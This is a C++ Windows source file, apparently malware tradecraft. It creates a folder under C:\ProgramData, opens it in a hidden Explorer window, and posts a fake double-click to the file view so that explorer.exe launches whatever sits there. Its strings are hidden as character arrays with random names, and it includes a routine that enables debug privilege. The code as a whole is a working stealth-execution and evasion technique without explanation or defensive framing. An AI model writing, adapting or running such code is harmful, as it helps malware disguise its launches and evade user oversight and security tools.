#include<Windows.h>
#include<TlHelp32.h>
#include<Commctrl.h>
#include<iostream>
#include<urlmon.h>
#include <string>
#pragma comment(lib,"urlmon.lib")
using namespace std;
HWND hwndd;
DWORD GetID() {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process)) {
		do {
			char sz02F5ATqa[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', '\0' };
			if (!wcscmp((wchar_t const*)process.szExeFile, (wchar_t const*)sz02F5ATqa))
				break;
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return process.th32ProcessID;
}

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);

	}
	return(fOk);
}

BOOL Cliki(HWND hwnd, LPARAM lParam) {
	char szGFRe9thb[] = { 'S', 'H', 'E', 'L', 'L', 'D', 'L', 'L', '_', 'D', 'e', 'f', 'V', 'i', 'e', 'w', '\0' };
	char szf6tWVqE7[] = { 'D', 'i', 'r', 'e', 'c', 't', 'U', 'I', 'H', 'W', 'N', 'D', '\0' };
	HWND hwnd11 = FindWindowEx(hwnd, NULL, szGFRe9thb, NULL);
	if (hwnd11 != NULL) {
		HWND hwnd12 = FindWindowEx(hwnd11, NULL, szf6tWVqE7, NULL);
		hwndd = hwnd12;
		return FALSE;

	}
	else
	{
		return TRUE;
	}
}

int main() {
	char szob8YRdRK[] = { 'C', ':', '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', 'D', 'a', 't', 'a', '\\', 'l', 'a', 's', 't', 'e', 'r', '\0' };
	CreateDirectory(szob8YRdRK, NULL);
	char szNcCot83p[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', ' ', 'C', ':', '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', 'D', 'a', 't', 'a', '\\', 'l', 'a', 's', 't', 'e', 'r', '\0' };
	string cmd = szNcCot83p;
	WinExec(cmd.c_str(), SW_HIDE);
	Sleep(1000);
	char szVbCgqb6m[] = { 'l', 'a', 's', 't', 'e', 'r', '\0' };
	HWND denh3 = FindWindowA(NULL, szVbCgqb6m);
	if (denh3 == NULL) { denh3 = FindWindowA(NULL, szob8YRdRK); };
	if (denh3 != NULL) {
		cout << "yes" << endl;
	}
	char szq7HWlhsw[] = { 'S', 'h', 'e', 'l', 'l', 'T', 'a', 'b', 'W', 'i', 'n', 'd', 'o', 'w', 'C', 'l', 'a', 's', 's', '\0' };
	SetWindowPos(denh3, HWND_BOTTOM, 0, 0, 0, 0, SWP_NOSIZE | SWP_HIDEWINDOW);
	HWND hwnd9 = FindWindowEx(denh3, NULL, szq7HWlhsw, NULL);
	char sz3jHdyHUw[] = { 'D', 'U', 'I', 'V', 'i', 'e', 'w', 'W', 'n', 'd', 'C', 'l', 'a', 's', 's', 'N', 'a', 'm', 'e', '\0' };
	HWND hwnd10 = FindWindowEx(hwnd9, NULL, sz3jHdyHUw, NULL);
	char szLJiywUGB[] = { 'D', 'i', 'r', 'e', 'c', 't', 'U', 'I', 'H', 'W', 'N', 'D', '\0' };
	HWND hwnd11 = FindWindowEx(hwnd10, NULL, szLJiywUGB, NULL);
	char myBuffer[100];
	GetClassName(hwnd11, myBuffer, 100);
	EnumChildWindows(hwnd11, (WNDENUMPROC)Cliki, NULL);

	PostMessage(hwndd, WM_LBUTTONDOWN, NULL, MAKELPARAM(30, 43));
	PostMessage(hwndd, WM_LBUTTONUP, NULL, MAKELPARAM(30, 43));

	PostMessage(hwndd, WM_LBUTTONDOWN, NULL, MAKELPARAM(30, 43));
	PostMessage(hwndd, WM_LBUTTONUP, NULL, MAKELPARAM(30, 43));

	return 0;
}